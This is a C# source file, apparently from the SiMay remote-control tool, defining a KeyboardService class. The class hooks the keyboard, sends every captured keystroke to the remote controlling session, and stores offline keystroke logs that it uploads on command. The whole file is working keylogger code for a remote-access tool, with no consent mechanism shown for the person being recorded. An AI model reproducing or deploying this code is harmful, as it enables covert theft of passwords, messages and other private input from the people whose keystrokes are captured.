using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using SiMay.ServiceCore.Attributes;

namespace SiMay.ServiceCore
{
    [ServiceName("键盘输入记录")]
    [ApplicationKeyAttribute(ApplicationKeyConstant.REMOTE_KEYBOARD)]
    public class KeyboardService : ApplicationRemoteService
    {
        private Keyboard _keyboard;
        public override void SessionInited(SessionProviderContext session)
        {

        }

        public override void SessionClosed()
        {
            if (_keyboard != null)
            {
                _keyboard.NotiyProc -= _keyboard_NotiyProc;
                _keyboard.CloseHook();
                _keyboard = null;
            }
        }

        [PacketHandler(MessageHead.S_KEYBOARD_OFFLINE)]
        public void ActionOffLineRecords(SessionProviderContext session)
            => _keyboard.StartOfflineRecords();

        [PacketHandler(MessageHead.S_KEYBOARD_GET_OFFLINEFILE)]
        public void SendOffLineRecord(SessionProviderContext session)
        {
            CurrentSession.SendTo(MessageHead.C_KEYBOARD_OFFLINEFILE,
                _keyboard.GetOfflineRecord());
        }

        [PacketHandler(MessageHead.S_KEYBOARD_ONOPEN)]
        public void Init(SessionProviderContext session)
        {
            _keyboard = Keyboard.GetKeyboardInstance();
            _keyboard.NotiyProc += new Keyboard.KeyboardNotiyHandler(_keyboard_NotiyProc);
            _keyboard.Initialization();
        }

        private void _keyboard_NotiyProc(Keyboard.KeyboardHookEvent kevent, string key)
        {
            switch (kevent)
            {
                case Keyboard.KeyboardHookEvent.OpenSuccess:
                    break;

                case Keyboard.KeyboardHookEvent.OpenFail:
                    CloseSession();
                    break;

                case Keyboard.KeyboardHookEvent.Data:
                    CurrentSession.SendTo(MessageHead.C_KEYBOARD_DATA, key);
                    break;
            }
        }
    }
}